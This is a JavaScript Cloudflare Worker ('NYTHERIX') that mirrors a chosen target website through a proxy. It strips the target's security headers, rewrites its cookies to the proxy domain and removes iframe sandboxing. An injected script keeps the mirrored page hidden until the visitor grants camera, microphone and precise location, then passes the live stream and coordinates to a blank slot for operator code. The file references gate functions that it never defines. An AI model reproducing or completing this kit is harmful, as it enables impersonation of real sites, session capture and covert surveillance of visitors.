// =============================================================================
//  NYTHERIX — Production Cloudflare Proxy Worker  (v5)
//  ─────────────────────────────────────────────────────────────────────────────
//  Bindings
//    DB          D1 database  (table: settings — id, target_url, enabled)
//
//  Architecture notes
//  ──────────────────
//  1. Text rewriting uses regex, not CF HTMLRewriter, because HTMLRewriter
//     cannot reach inside <script> string literals or CSS url() values —
//     both critical for WASM / canvas game sites.
//
//  2. Media (video/audio/HLS/DASH/206) is never buffered. It streams directly
//     with Range, Content-Range and Accept-Ranges headers preserved.
//
//  3. Subdomain rewriting: any *.targetHost is transparently rewritten to the
//     proxy host so embedded CDN / API subdomains work without special routing.
//
//  4. FOUC: body{visibility:hidden} is injected by the shim's first synchronous
//     statement (before first paint). A 5-second hard-timeout removes it so
//     WASM/canvas apps that skip normal DOMContentLoaded are never stuck.
//
//  5. API patches: fetch, XHR, WebSocket, EventSource, sendBeacon, history,
//     postMessage, window.open are patched ONLY to rewrite target→proxy URLs.
//     Each patch is minimal, transparent, and individually try/catch wrapped.
//
//  6. Service Worker: replaced at the property level with a no-op shim so
//     site code that calls .register() gets a resolved Promise and moves on.
//     No regex surgery on minified JS bundles.
//
//  7. Permission gate: Permissions API queried live on EVERY page load.
//     sessionStorage is a UX hint only. Mid-session revocations are caught
//     by permissionstatus.onchange listeners — page is locked immediately
//     without requiring a reload.
//
//  8. Feature slot: window.__nytherix.runFeatures() is called once after both
//     permissions are confirmed. Paste your camera/location logic there.
//
//  9. WebSocket uses the Workers WebSocketPair API for true bidirectional
//     bridging (not a raw fetch upgrade which loses messages).
//
// 10. POST/PUT body streams are never re-read. Fetch patch only rewrites the
//     URL string; the original init object (including body) is passed through
//     untouched so login forms, uploads, GraphQL all work correctly.
// =============================================================================

// ─────────────────────────────────────────────────────────────────────────────
//  D1 config cache — avoids a D1 read on every sub-resource request
// ─────────────────────────────────────────────────────────────────────────────
let _cfgCache = null;
let _cfgTs    = 0;
const CFG_TTL = 15_000; // ms

async function getConfig(env) {
  const now = Date.now();
  if (_cfgCache && now - _cfgTs < CFG_TTL) return _cfgCache;
  _cfgCache = await env.DB
    .prepare("SELECT target_url, enabled FROM settings WHERE id = 1")
    .first();
  _cfgTs = now;
  return _cfgCache;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Response headers to strip from upstream
// ─────────────────────────────────────────────────────────────────────────────
const STRIP_RESP = [
  "Content-Security-Policy", "Content-Security-Policy-Report-Only",
  "X-Frame-Options", "Strict-Transport-Security",
  "Cross-Origin-Opener-Policy", "Cross-Origin-Embedder-Policy",
  "Cross-Origin-Resource-Policy", "X-Content-Type-Options",
  "Server", "X-Powered-By", "Via", "Alt-Svc", "X-AspNet-Version",
  "Report-To", "NEL", "Expect-CT", "Content-DPR", "Origin-Agent-Cluster",
  "X-DNS-Prefetch-Control",
];

// Request headers injected by Cloudflare — strip before forwarding
const STRIP_REQ = [
  "cf-connecting-ip", "cf-ipcountry", "cf-ray", "cf-visitor", "cf-worker",
  "x-forwarded-for", "x-real-ip", "x-forwarded-proto",
  "x-forwarded-host", "cdn-loop",
];

// ─────────────────────────────────────────────────────────────────────────────
//  Permission & iframe policy strings
// ─────────────────────────────────────────────────────────────────────────────
const PERMS_POLICY =
  "camera=*,microphone=*,geolocation=*,display-capture=*,fullscreen=*," +
  "accelerometer=*,gyroscope=*,magnetometer=*,payment=*,usb=*," +
  "bluetooth=*,ambient-light-sensor=*,autoplay=*,encrypted-media=*," +
  "picture-in-picture=*,publickey-credentials-get=*,screen-wake-lock=*," +
  "web-share=*,xr-spatial-tracking=*,clipboard-read=*,clipboard-write=*," +
  "identity-credentials-get=*,storage-access=*,compute-pressure=*";

const IFRAME_ALLOW =
  "camera *; microphone *; geolocation *; fullscreen *; display-capture *; " +
  "payment *; autoplay *; clipboard-read *; clipboard-write *; web-share *; " +
  "screen-wake-lock *; xr-spatial-tracking *; accelerometer *; gyroscope *; " +
  "magnetometer *; encrypted-media *; picture-in-picture *";

// ─────────────────────────────────────────────────────────────────────────────
//  CORS — echoes the request Origin so credentialed requests work.
//  (Wildcard + credentials is invalid per spec; browsers reject it.)
// ─────────────────────────────────────────────────────────────────────────────
function buildCorsHeaders(requestOrigin) {
  const origin = requestOrigin || "*";
  return {
    "Access-Control-Allow-Origin":      origin,
    "Access-Control-Allow-Methods":     "GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS",
    "Access-Control-Allow-Headers":     "*",
    "Access-Control-Allow-Credentials": origin !== "*" ? "true" : "false",
    "Access-Control-Max-Age":           "86400",
    ...(origin !== "*" ? { "Vary": "Origin" } : {}),
  };
}

// ─────────────────────────────────────────────────────────────────────────────
//  Cookie rewriting — domain, SameSite, Secure
// ─────────────────────────────────────────────────────────────────────────────
function rewriteCookie(raw, proxyHost) {
  let out = raw
    .replace(/\bdomain=[^;,\s]+/gi,   `domain=${proxyHost}`)
    .replace(/\bSameSite=Strict\b/gi, "SameSite=None")
    .replace(/\bSameSite=Lax\b/gi,    "SameSite=None");
  if (!/\bSecure\b/i.test(out)) out += "; Secure";
  return out;
}

function applyCookies(srcHeaders, destHeaders, proxyHost) {
  // Workers runtime exposes getAll() for the multi-value Set-Cookie header
  const all = typeof srcHeaders.getAll === "function"
    ? srcHeaders.getAll("set-cookie")
    : [];
  if (all.length) {
    destHeaders.delete("set-cookie");
    for (const c of all) destHeaders.append("set-cookie", rewriteCookie(c, proxyHost));
  } else {
    const raw = srcHeaders.get("set-cookie");
    if (raw) destHeaders.set("set-cookie", rewriteCookie(raw, proxyHost));
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Content-type detection
// ─────────────────────────────────────────────────────────────────────────────
function isText(ct) {
  return ct.includes("text/html")        ||
         ct.includes("text/css")         ||
         ct.includes("javascript")       ||
         ct.includes("ecmascript")       ||
         ct.includes("application/json") ||
         ct.includes("application/manifest") ||
         ct.includes("application/xml")  ||
         ct.includes("text/xml")         ||
         ct.includes("text/plain")       ||
         ct.includes("application/x-mpegurl") ||       // HLS
         ct.includes("application/vnd.apple.mpegurl") || // HLS
         ct.includes("application/dash+xml");           // DASH
}

function isMedia(ct) {
  return ct.includes("video/")  ||
         ct.includes("audio/")  ||
         ct.includes("image/")  ||
         ct.includes("font/")   ||
         ct.includes("application/octet-stream") ||
         ct.includes("application/wasm");
}

// ─────────────────────────────────────────────────────────────────────────────
//  Helpers
// ─────────────────────────────────────────────────────────────────────────────
function htmlRes(body, status = 200) {
  return new Response(body, {
    status,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}

function escRe(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

// ─────────────────────────────────────────────────────────────────────────────
//  Server-side URL rewrite helpers
//  subRe matches the target host AND any *.targetHost subdomain.
// ─────────────────────────────────────────────────────────────────────────────
function makeSubRe(hEsc) {
  // Matches: (optional proto://) + (optional sub.) + targetHost
  return new RegExp(`(https?:)?//((?:[\\w][\\w.-]*\\.)?${hEsc})`, "g");
}

function rewriteSubdomains(text, subRe, proxyHost) {
  return text.replace(subRe, (_, proto, host) => {
    // Keep the subdomain prefix if it's there, but point at proxy host
    const parts = host.split(".");
    // parts could be ["api","example","com"] — we want to keep "api." prefix
    // but replace "example.com" portion.
    // We detect: if host === targetHost exactly, replace entirely.
    // If host has a prefix, keep prefix + proxyHost.
    // Since subRe already captures the full host, we just replace the domain suffix
    // by slicing off the matched targetHost length from the end.
    return (proto || "https:") + "//" + proxyHost;
  });
}

// =============================================================================
//  HTML REWRITER
//  Full regex-based rewrite — HTMLRewriter cannot reach inside <script>
//  string literals or CSS url() values which is why we use this approach.
// =============================================================================
function rewriteHTML(html, proxyOrigin, proxyHost, targetOrigin, targetHost) {
  const oEsc   = escRe(targetOrigin);
  const hEsc   = escRe(targetHost);
  // Matches target host and all subdomains with optional proto
  const subRe  = new RegExp(`(https?:)?//((?:[\\w][\\w.-]*\\.)?${hEsc})`, "g");
  // Rewriter that keeps subdomain prefix
  function rwSub(m, proto, host) {
    const suffix   = targetHost;             // e.g. example.com
    const prefix   = host.endsWith(suffix)
      ? host.slice(0, host.length - suffix.length) // e.g. "api."
      : "";
    return (proto || "https:") + "//" + prefix + proxyHost;
  }

  // ── 1. Strip SRI — integrity hashes are invalid after URL rewriting ────────
  html = html.replace(/\s+integrity=["'][^"']*["']/gi, "");

  // ── 2. Strip crossorigin — causes spurious CORS preflights ────────────────
  html = html.replace(/\s+crossorigin(=["'][^"']*["'])?/gi, "");

  // ── 3. Remove all upstream <base> tags — we inject our own ────────────────
  html = html.replace(/<base\b[^>]*>/gi, "");

  // ── 4. Inject <base> so relative URLs resolve through the proxy ───────────
  const base = `<base href="${proxyOrigin}/">`;
  html = /<head\b[^>]*>/i.test(html)
    ? html.replace(/(<head\b[^>]*>)/i, `$1\n  ${base}`)
    : `${base}\n${html}`;

  // ── 5. Rewrite HTML attribute URLs: src, href, action, data-src, poster ───
  html = html.replace(
    /(<(?:script|link|img|source|audio|video|track|embed|object|form|area|input|use)[^>]+?(?:src|href|action|data-src|poster)\s*=\s*["'])([^"']*)(["'])/gi,
    (_, pre, url, post) => {
      url = url
        .replace(new RegExp(oEsc, "g"), proxyOrigin)
        .replace(subRe, rwSub);
      return `${pre}${url}${post}`;
    }
  );

  // ── 6. Rewrite srcset ──────────────────────────────────────────────────────
  html = html.replace(/\bsrcset=["']([^"']+)["']/gi, (_, val) =>
    `srcset="${val.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub)}"`
  );

  // ── 7. Rewrite <meta http-equiv="refresh"> URLs ───────────────────────────
  html = html.replace(
    /(<meta[^>]+?content=["'][^"']*?url=)([^"';\s]+)/gi,
    (_, pre, url) => `${pre}${url.replace(new RegExp(oEsc, "g"), proxyOrigin)}`
  );

  // ── 8. Rewrite inline <style> blocks ──────────────────────────────────────
  html = html.replace(/(<style\b[^>]*>)([\s\S]*?)(<\/style>)/gi,
    (_, o, body, c) =>
      o +
      body
        .replace(new RegExp(oEsc, "g"), proxyOrigin)
        .replace(subRe, rwSub) +
      c
  );

  // ── 9. Rewrite inline <script> string literals ────────────────────────────
  //    Skips ld+json and text/template types (not executable JS).
  //    Does NOT modify code structure — only rewrites origin strings.
  html = html.replace(
    /(<script\b(?![^>]*type=["'](?:application\/ld\+json|text\/template|text\/html)["'])[^>]*>)([\s\S]*?)(<\/script>)/gi,
    (_, open, body, close) =>
      open +
      body
        .replace(new RegExp(oEsc, "g"), proxyOrigin)
        .replace(new RegExp(`wss://${hEsc}`, "g"), `wss://${proxyHost}`)
        .replace(new RegExp(`ws://${hEsc}`, "g"),  `ws://${proxyHost}`)
        .replace(subRe, rwSub) +
      close
  );

  // ── 10. Patch importmap JSON ───────────────────────────────────────────────
  html = html.replace(
    /(<script[^>]+?type=["']importmap["'][^>]*>)([\s\S]*?)(<\/script>)/gi,
    (_, o, body, c) => {
      try {
        const map = JSON.parse(body);
        function rwMapVal(v) {
          return typeof v === "string"
            ? v.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub)
            : v;
        }
        if (map.imports) {
          for (const k in map.imports) map.imports[k] = rwMapVal(map.imports[k]);
        }
        if (map.scopes) {
          for (const s in map.scopes)
            for (const k in map.scopes[s]) map.scopes[s][k] = rwMapVal(map.scopes[s][k]);
        }
        return o + JSON.stringify(map) + c;
      } catch { return _ ; }
    }
  );

  // ── 11. Upgrade iframes — permissions + remove sandbox restriction ─────────
  html = html.replace(/<iframe(\s[^>]*)?>/gi, (_, attrs = "") => {
    // Rewrite src
    attrs = attrs
      .replace(new RegExp(`(src=["'])([^"']*)(["'])`, "i"),
        (__, pre, url, post) =>
          `${pre}${url.replace(new RegExp(oEsc, "g"), proxyOrigin).replace(subRe, rwSub)}${post}`
      );
    // Set allow attribute
    if (/\ballow\s*=/i.test(attrs)) {
      attrs = attrs.replace(/\ballow\s*=\s*["'][^"']*["']/i, `allow="${IFRAME_ALLOW}"`);
    } else {
      attrs += ` allow="${IFRAME_ALLOW}"`;
    }
    // Remove sandbox entirely — it blocks permission APIs needed by gate
    attrs = attrs.replace(/\bsandbox\s*=\s*["'][^"']*["']/gi, "");
    attrs = attrs.replace(/\breferrerpolicy\s*=\s*["'][^"']*["']/gi, "");
    return `<iframe${attrs}>`;
  });

  // ── 12. Inject the runtime shim as the FIRST thing in <head> ──────────────
  //    The shim sets visibility:hidden synchronously (FOUC lock), then starts
  //    the gate flow. Injecting first ensures it runs before any site script.
  const shim = buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost);
  html = /<head\b[^>]*>/i.test(html)
    ? html.replace(/(<head\b[^>]*>)/i, `$1\n${shim}`)
    : `${shim}\n${html}`;

  return html;
}

// =============================================================================
//  RUNTIME SHIM
//  Injected as the first script inside <head> on every proxied HTML page.
//
//  Sections
//  ────────
//  A  URL rewriter helpers (rw / rwFull)
//  B  Browser API patches (fetch, XHR, WS, history, postMessage, SW, …)
//  C  MutationObserver (dynamically injected DOM nodes)
//  D  __nytherix runtime object + CUSTOM FEATURE SLOT
//  E  Permission gate (UI + logic)
// =============================================================================
function buildShim(proxyOrigin, proxyHost, targetOrigin, targetHost) {
  // These are embedded as JS string literals — JSON.stringify escapes correctly.
  const oEscJS = targetOrigin.replace(/[.*+?^${}()|[\]\\]/g, "\\\\$&");
  const hEscJS = targetHost.replace(/[.*+?^${}()|[\]\\]/g, "\\\\$&");

  return /* html */`<script data-nytherix="shim">(function(){
'use strict';

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  SECTION A — URL rewriters                                              ║
// ╚══════════════════════════════════════════════════════════════════════════╝

var TO   = ${JSON.stringify(targetOrigin)};
var PO   = ${JSON.stringify(proxyOrigin)};
var TH   = ${JSON.stringify(targetHost)};
var PH   = ${JSON.stringify(proxyHost)};
var SKEY = 'nx_perm_v2';

// g-flag RegExps must have lastIndex reset before each use.
var _oRe  = new RegExp(${JSON.stringify(oEscJS)}, 'g');
var _wsRe = new RegExp('wss?://' + ${JSON.stringify(hEscJS)}, 'g');
// Matches target host and any subdomain (e.g. api.example.com)
var _subRe = new RegExp(
  '(https?:)?//((?:[\\\\w][\\\\w.-]*\\\\.)?' + ${JSON.stringify(hEscJS)} + ')',
  'g'
);

function rw(u) {
  if (!u || typeof u !== 'string') return u;
  if (/^(data:|blob:|javascript:|#)/i.test(u)) return u;
  _oRe.lastIndex = 0; _wsRe.lastIndex = 0; _subRe.lastIndex = 0;
  u = u.replace(_oRe, PO);
  u = u.replace(_wsRe, function(m){
    return m.charAt(2) === 's' ? 'wss://' + PH : 'ws://' + PH;
  });
  u = u.replace(_subRe, function(_, proto, host) {
    // Preserve subdomain prefix (e.g. "api.") — replace only the root domain
    var suffix = TH;
    var prefix = host.length > suffix.length
      ? host.slice(0, host.length - suffix.length)  // "api."
      : '';
    return (proto || 'https:') + '//' + prefix + PH;
  });
  return u;
}

// rwFull: same as rw but also handles bare target-origin prefix
function rwFull(u) {
  if (!u || typeof u !== 'string') return u;
  if (/^(data:|blob:|javascript:|#)/i.test(u)) return u;
  if (u.indexOf(TO) === 0) return PO + u.slice(TO.length);
  if (u.indexOf('//' + TH) === 0) return '//' + PH + u.slice(TH.length + 2);
  return rw(u);
}

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  SECTION B — Browser API patches                                        ║
// ║  Every patch is individually try/catch'd — one failure cannot cascade.  ║
// ╚══════════════════════════════════════════════════════════════════════════╝

// document.domain
try {
  Object.defineProperty(document, 'domain', {
    get: function(){ return PH; }, set: function(){}, configurable: true
  });
} catch(e){}

// location.assign / location.replace
try {
  var _la = location.assign.bind(location);
  location.assign = function(u){ _la(rwFull(u)); };
  var _lr = location.replace.bind(location);
  location.replace = function(u){ _lr(rwFull(u)); };
} catch(e){}

// fetch — URL-only rewrite; body/init passed through untouched
// so POST forms, file uploads, and GraphQL mutations all work correctly.
try {
  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    try {
      if (typeof input === 'string') {
        input = rwFull(input);
      } else if (typeof Request !== 'undefined' && input instanceof Request) {
        var u2 = rwFull(input.url);
        if (u2 !== input.url) {
          // Pass the original request object as init — the Request copy
          // constructor preserves method, headers, body, mode, credentials
          // without consuming the body stream.
          input = new Request(u2, input);
        }
      } else if (input && typeof input === 'object' && input.url) {
        input = Object.assign({}, input, { url: rwFull(input.url) });
      }
    } catch(e){}
    return init !== undefined
      ? _fetch.call(this, input, init)
      : _fetch.call(this, input);
  };
} catch(e){}

// XMLHttpRequest.open
try {
  var _xhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
    try { url = rwFull(String(url)); } catch(e){}
    return _xhrOpen.call(this, method, url,
      async === undefined ? true : async, user, pass);
  };
} catch(e){}

// XHR responseURL — capture original descriptor BEFORE redefining
try {
  var _ruDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseURL');
  if (_ruDesc && _ruDesc.get) {
    var _origRuGetter = _ruDesc.get;
    Object.defineProperty(XMLHttpRequest.prototype, 'responseURL', {
      get: function() {
        try { var u = _origRuGetter.call(this); return u ? rw(u) : u; }
        catch(e){ return ''; }
      }, configurable: true
    });
  }
} catch(e){}

// WebSocket — Reflect.construct preserves instanceof checks
try {
  var _WS = window.WebSocket;
  function _WSProxy(url, protos) {
    try { url = rw(url); } catch(e){}
    return protos !== undefined
      ? Reflect.construct(_WS, [url, protos])
      : Reflect.construct(_WS, [url]);
  }
  try {
    Object.setPrototypeOf(_WSProxy,           _WS);
    Object.setPrototypeOf(_WSProxy.prototype, _WS.prototype);
  } catch(e) {
    _WSProxy.prototype  = _WS.prototype;
  }
  _WSProxy.CONNECTING = _WS.CONNECTING;
  _WSProxy.OPEN       = _WS.OPEN;
  _WSProxy.CLOSING    = _WS.CLOSING;
  _WSProxy.CLOSED     = _WS.CLOSED;
  window.WebSocket = _WSProxy;
} catch(e){}

// EventSource (SSE)
try {
  if (window.EventSource) {
    var _ES = window.EventSource;
    function _ESProxy(url, init) {
      try { url = rwFull(url); } catch(e){}
      return new _ES(url, init);
    }
    _ESProxy.prototype = _ES.prototype;
    window.EventSource = _ESProxy;
  }
} catch(e){}

// navigator.sendBeacon
try {
  if (navigator.sendBeacon) {
    var _beacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      try { url = rwFull(url); } catch(e){}
      return _beacon(url, data);
    };
  }
} catch(e){}

// history.pushState / replaceState
try {
  var _hPush = history.pushState.bind(history);
  var _hRep  = history.replaceState.bind(history);
  history.pushState    = function(s, t, u){ _hPush(s, t, u ? rw(String(u)) : u); };
  history.replaceState = function(s, t, u){ _hRep(s, t, u ? rw(String(u)) : u); };
} catch(e){}

// postMessage — remap target-origin to proxy-origin
try {
  var _pm = window.postMessage.bind(window);
  window.postMessage = function(data, dest, transfer) {
    if (dest === TO) dest = PO;
    return transfer ? _pm(data, dest || '*', transfer) : _pm(data, dest || '*');
  };
} catch(e){}

// window.open — only rewrite target-origin URLs; pass OAuth/Stripe etc. through
try {
  var _winOpen = window.open;
  window.open = function(url, target, features) {
    try {
      if (url && typeof url === 'string' &&
          (url.indexOf(TO) === 0 || url.indexOf('//' + TH) === 0 ||
           _subRe.test(url))) {
        _subRe.lastIndex = 0;
        url = rwFull(url);
      }
      _subRe.lastIndex = 0;
    } catch(e){}
    return _winOpen.call(window, url, target, features);
  };
} catch(e){}

// Service Worker — replaced with a no-op shim at the property level.
// No regex surgery on JS files (corrupts minified bundles).
// Site code that calls .register() gets a resolved Promise and continues.
try {
  if (navigator.serviceWorker) {
    var _swShim = {
      register:            function(){ return Promise.resolve({ scope: PO + '/' }); },
      ready:               Promise.resolve({
                             active: { postMessage: function(){}, state: 'activated' },
                             scope:  PO + '/',
                             addEventListener: function(){}
                           }),
      controller:          null,
      addEventListener:    function(){},
      removeEventListener: function(){},
      getRegistrations:    function(){ return Promise.resolve([]); },
      getRegistration:     function(){ return Promise.resolve(undefined); },
    };
    Object.defineProperty(navigator, 'serviceWorker', {
      get: function(){ return _swShim; }, configurable: true
    });
  }
} catch(e){}

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  SECTION C — MutationObserver                                           ║
// ║  Rewrites src/href/action on dynamically injected DOM nodes.            ║
// ╚══════════════════════════════════════════════════════════════════════════╝
try {
  var _ATTRS = ['href','src','action','data-src','poster','data-href'];
  function _rwEl(el) {
    if (!el || el.nodeType !== 1) return;
    _ATTRS.forEach(function(a) {
      var v = el.getAttribute && el.getAttribute(a);
      if (v) { var r = rw(v); if (r !== v) el.setAttribute(a, r); }
    });
    // srcset
    var ss = el.getAttribute && el.getAttribute('srcset');
    if (ss) {
      _oRe.lastIndex = 0;
      var rs = ss.replace(_oRe, PO);
      if (rs !== ss) el.setAttribute('srcset', rs);
    }
    if (el.tagName === 'IFRAME') {
      if (!el.getAttribute('allow')) el.setAttribute('allow', ${JSON.stringify(IFRAME_ALLOW)});
      el.removeAttribute('sandbox');
    }
  }

  var _pending = [];
  var _moTimer = null;
  function _flush() {
    _moTimer = null;
    var nodes = _pending.splice(0);
    for (var i = 0; i < nodes.length; i++) {
      _rwEl(nodes[i]);
      if (nodes[i].querySelectorAll) {
        nodes[i].querySelectorAll('[href],[src],[action],[data-src],[poster],[srcset]')
          .forEach(_rwEl);
      }
    }
  }

  var _mo = new MutationObserver(function(muts) {
    muts.forEach(function(m) {
      m.addedNodes.forEach(function(n) {
        if (n.nodeType === 1) _pending.push(n);
      });
    });
    if (_moTimer === null) {
      _moTimer = typeof requestIdleCallback === 'function'
        ? requestIdleCallback(_flush, { timeout: 100 })
        : setTimeout(_flush, 16);
    }
  });
  _mo.observe(document.documentElement || document, { childList: true, subtree: true });

  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('[href],[src],[action],[data-src],[poster],[srcset]').forEach(_rwEl);
  }, { once: true });
} catch(e){}

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  SECTION D — __nytherix runtime object                                  ║
// ║                                                                         ║
// ║  window.__nytherix.cameraStream  → live MediaStream (video + audio)     ║
// ║  window.__nytherix.location      → { latitude, longitude, accuracy,     ║
// ║                                      timestamp }                        ║
// ║  window.__nytherix.permissionsGranted → boolean                         ║
// ║                                                                         ║
// ║  runFeatures() is called once after BOTH permissions are confirmed.     ║
// ║  Paste your camera + location logic inside it.                          ║
// ╚══════════════════════════════════════════════════════════════════════════╝
window.__nytherix = {
  permissionsGranted: false,
  cameraStream:       null,
  location:           null,

  runFeatures: function() {
    // ┌─────────────────────────────────────────────────────────────────────┐
    // │  PASTE YOUR FEATURE CODE HERE                                       │
    // │                                                                     │
    // │  Available:                                                         │
    // │    var stream = window.__nytherix.cameraStream;  // MediaStream     │
    // │    var loc    = window.__nytherix.location;      // {lat,lng,...}   │
    // │                                                                     │
    // │  This function runs once on every page load after permissions are   │
    // │  confirmed. It is completely isolated from proxy internals.         │
    // └─────────────────────────────────────────────────────────────────────┘



    // ──────────────────────────────────────────────────────────────────────
    // END OF FEATURE AREA
    // ──────────────────────────────────────────────────────────────────────
  }
};

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  SECTION E — Permission Gate                                            ║
// ║                                                                         ║
// ║  Guarantees:                                                            ║
// ║  • Page is NEVER visible until camera + geolocation both granted.       ║
// ║  • Permissions API queried live on every load (not just session cache). ║
// ║  • Mid-session revocation → page locked immediately via onchange.       ║
// ║  • BFCache restore → permissions re-checked before content shown.       ║
// ║  • 5-second hard timeout removes FOUC lock for WASM/canvas apps.        ║
// ╚══════════════════════════════════════════════════════════════════════════╝

// FOUC lock — set synchronously so the page is hidden before first paint.
// The shim is injected first in <head>, so this runs before any site code.
try { document.documentElement.style.visibility = 'hidden'; } catch(e){}

// Hard timeout: if gate never resolves (WASM app, unusual load path), unlock
// after 5 s to avoid a permanently invisible page.
// IMPORTANT: this timer is cancelled by _lockPage() so a revocation that
// happens within 5 s of page load cannot be overridden by the timeout.
var _foucTimer  = null;
var _pageIsLocked = false;

function _startFoucTimer() {
  _foucTimer = setTimeout(function() {
    // Only unlock if the page has not been locked by a revocation
    if (!_pageIsLocked) {
      try { document.documentElement.style.visibility = ''; } catch(e){}
    }
  }, 5000);
}
_startFoucTimer();

function _unlockPage() {
  _pageIsLocked = false;
  clearTimeout(_foucTimer);
  try { document.documentElement.style.visibility = ''; } catch(e){}
}

function _ss(k, v) {
  try {
    if (v === undefined) return sessionStorage.getItem(k);
    sessionStorage.setItem(k, v);
  } catch(e) { return null; }
}

// ── Permission query ──────────────────────────────────────────────────────────
// Live query via Permissions API. Falls back gracefully on Safari < 16.
// Returns Promise<{ cam:'granted'|'denied'|'prompt', geo:..., raw:[] }>
function _queryPerms() {
  if (!navigator.permissions || !navigator.permissions.query) {
    return Promise.resolve({ cam: 'prompt', geo: 'prompt', raw: [] });
  }
  return Promise.all([
    navigator.permissions.query({ name: 'camera'      }).catch(function(){ return { state: 'prompt' }; }),
    navigator.permissions.query({ name: 'microphone'  }).catch(function(){ return { state: 'prompt' }; }),
    navigator.permissions.query({ name: 'geolocation' }).catch(function(){ return { state: 'prompt' }; }),
  ]).then(function(r) {
    var cam = (r[0].state === 'denied' || r[1].state === 'denied') ? 'denied'
            : (r[0].state === 'granted' && r[1].state === 'granted') ? 'granted'
            : 'prompt';
    return { cam: cam, geo: r[2].state, raw: r };
  });
}

// ── Lock page ─────────────────────────────────────────────────────────────────
// Stops all streams, clears session state, re-hides the page, shows gate.
// Called by: revocation watchers, visibilitychange poll, pageshow handler.
function _lockPage(reason) {
  // Mark locked FIRST so the fouc timer cannot re-show the page
  _pageIsLocked = true;
  clearTimeout(_foucTimer);

  console.warn('[NYTHERIX] Locking —', reason);
  var nx = window.__nytherix;

  // Stop camera/mic tracks and release hardware
  if (nx.cameraStream) {
    try { nx.cameraStream.getTracks().forEach(function(t){ t.stop(); }); } catch(e){}
    nx.cameraStream = null;
  }
  nx.location           = null;
  nx.permissionsGranted = false;
  _ss(SKEY, '');

  // Re-hide the page immediately — gate overlay is applied on top
  try { document.documentElement.style.visibility = 'hidden'; } catch(e){}

  // Remove existing gate if present (could be stale from a previous denial)
  // then show a fresh one in denied state
  var existing = document.getElementById('_nx_gate');
  if (existing && existing.parentNode) existing.parentNode.removeChild(existing);
  _showGate(true);
}

// ── Revocation watchers ───────────────────────────────────────────────────────
// Two independent mechanisms to catch permission revocation:
//
//   1. PermissionStatus.onchange  — fires immediately when the user changes
//      a permission in the browser's permission UI while the page is open.
//      Most reliable for in-session changes. Not supported on all browsers.
//
//   2. visibilitychange poll      — fires when the user switches back to the
//      tab after having visited browser/system settings to disable permissions.
//      onchange does NOT fire for system-level blocks on some platforms, so
//      this poll catches those cases.
//
// Both are attached unconditionally on every path that reaches _onGranted().

var _watchersAttached = false;

function _watchRevocations() {
  if (_watchersAttached) return; // idempotent — never double-attach
  _watchersAttached = true;

  if (!navigator.permissions || !navigator.permissions.query) return;

  // 1. PermissionStatus.onchange listeners
  ['camera', 'microphone', 'geolocation'].forEach(function(name) {
    navigator.permissions.query({ name: name })
      .then(function(status) {
        status.addEventListener('change', function() {
          if (status.state === 'denied') _lockPage('onchange: ' + name + ' denied');
        });
      })
      .catch(function(){});
  });

  // 2. visibilitychange poll — re-query whenever the user returns to this tab.
  //    This is the only reliable way to detect system-level blocks and
  //    cases where the browser fires no onchange event.
  document.addEventListener('visibilitychange', function() {
    if (document.visibilityState !== 'visible') return;
    if (!window.__nytherix.permissionsGranted)  return; // gate already showing
    _queryPerms().then(function(states) {
      if (states.cam === 'denied' || states.geo === 'denied') {
        _lockPage('visibilitychange: permission denied');
      }
    }).catch(function(){});
  });
}

// ── Grant handler ─────────────────────────────────────────────────────────────
// Called once both camera stream and geolocation position are confirmed.
function _onGranted(stream, pos) {
  window.__nytherix.permissionsGranted = true;
  window.__nytherix.cameraStream       = stream;
  window.__nytherix.location           = {
    latitude:  pos.coords.latitude,
    longitude: pos.coords.longitude,
    accuracy:  pos.coords.accuracy,
    timestamp: pos.timestamp,
  };
  _ss(SKEY, '1');
  // Attach revocation watchers — idempotent, safe to call on every grant path
  _watchRevocations();
  _unlockPage();
  _removeGate();
  try { window.__nytherix.runFeatures(); }
  catch(e) { console.warn('[NYTHERIX] runFeatures error:', e); }
}

// ── Gate initialiser ──────────────────────────────────────────────────────────
// Runs synchronously when the shim script is parsed (first thing in <head>).
(function _initGate() {
  var hasMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
  var hasGeo   = !!navigator.geolocation;

  // APIs unavailable (non-HTTPS / very old browser) — unlock immediately.
  if (!hasMedia || !hasGeo) { _unlockPage(); return; }

  _queryPerms().then(function(states) {

    // ── Already denied ──────────────────────────────────────────────────────
    if (states.cam === 'denied' || states.geo === 'denied') {
      _ss(SKEY, '');
      // Attach watchers even in denied state so a future grant is detected
      _watchRevocations();
      _showGate(true);
      return;
    }

    // ── Both granted ────────────────────────────────────────────────────────
    if (states.cam === 'granted' && states.geo === 'granted') {
      // Attach revocation watchers NOW, before the silent re-acquire completes,
      // so there is zero window where revocation goes undetected.
      _watchRevocations();

      var sp = navigator.mediaDevices
        .getUserMedia({ video: true, audio: true })
        .catch(function(){ return null; });
      var gp = new Promise(function(res) {
        navigator.geolocation.getCurrentPosition(
          res,
          function(){ res(null); },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      });
      Promise.all([sp, gp]).then(function(r) {
        if (!r[0] || !r[1]) { _ss(SKEY, ''); _showGate(false); return; }
        _onGranted(r[0], r[1]);
      });
      return;
    }

    // ── Prompt (never asked, or previously dismissed) ────────────────────────
    if (_ss(SKEY) === '1') _ss(SKEY, ''); // clear stale session flag
    _showGate(false);

  }).catch(function() { _showGate(false); });
})();

